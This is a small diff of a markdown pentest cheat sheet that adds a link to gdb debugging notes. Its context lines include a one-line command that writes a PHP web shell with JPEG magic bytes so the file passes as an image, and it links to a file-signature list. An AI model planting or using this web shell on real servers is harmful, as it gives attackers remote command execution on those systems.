@@ -28,6 +28,8 @@ PHP file as image  >  **echo '\xff\xd8<?=`{$_GET["cmd"]}`;' > exec.php**
 
 Magic byts [Magic byts](https://en.wikipedia.org/wiki/List_of_file_signatures)
 
+debug group [Debug group](asstes/file/gdb.md)
+
 
 # Web Applictions
 
